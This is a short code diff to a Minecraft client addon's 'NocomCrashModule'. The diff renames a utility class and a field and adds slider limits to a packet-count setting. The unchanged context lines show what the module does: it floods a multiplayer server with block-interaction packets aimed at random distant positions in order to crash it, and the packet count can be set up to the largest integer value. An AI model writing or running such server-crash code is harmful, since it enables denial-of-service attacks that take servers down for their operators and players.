@@ -14,7 +14,7 @@ import net.minecraft.util.math.Vec3d;
 import net.minecraft.util.math.Vec3i;
 import sources.net.thenoppy12.noppyaddon.NoppyAddon;
 import sources.net.thenoppy12.noppyaddon.NoppyInit;
-import sources.net.thenoppy12.noppyaddon.util.VectorConversionUtil;
+import sources.net.thenoppy12.noppyaddon.utils.VectorConversionUtils;
 import java.util.Random;
 
 // works but cant stop & test in way
@@ -26,6 +26,8 @@ public class NocomCrashModule extends Module {
             .description("Limit packets that send to server")
             .defaultValue(200)
             .range(1, Integer.MAX_VALUE)
+            .sliderMax(Integer.MAX_VALUE)
+            .sliderMin(1)
             .build()
     );
     private final Setting<Integer> sleep = sgGeneral.add(new IntSetting.Builder()
@@ -65,19 +67,19 @@ public class NocomCrashModule extends Module {
             if(i % 100 == 0 || i == nPackets)
                 ChatUtils.info(String.format("%d/%d", i, nPackets));
 
-            if(NoppyAddon.MC.getNetworkHandler() == null)
+            if(NoppyAddon.minecraft.getNetworkHandler() == null)
                 break;
 
             Thread.sleep(sleep.get());
 
             // generate and send the packet
             PlayerInteractBlockC2SPacket packet = createNocomPacket();
-            NoppyAddon.MC.getNetworkHandler().sendPacket(packet);
+            NoppyAddon.minecraft.getNetworkHandler().sendPacket(packet);
         }
     }
     public PlayerInteractBlockC2SPacket createNocomPacket() {
         Vec3d pos3d = pickRandomPos();
-        Vec3i pos3i = VectorConversionUtil.convert(pos3d);
+        Vec3i pos3i = VectorConversionUtils.convert(pos3d);
         BlockHitResult blockHitResult = new BlockHitResult(pos3d, Direction.DOWN, new BlockPos(pos3i), false);
 
         return new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult, 0);
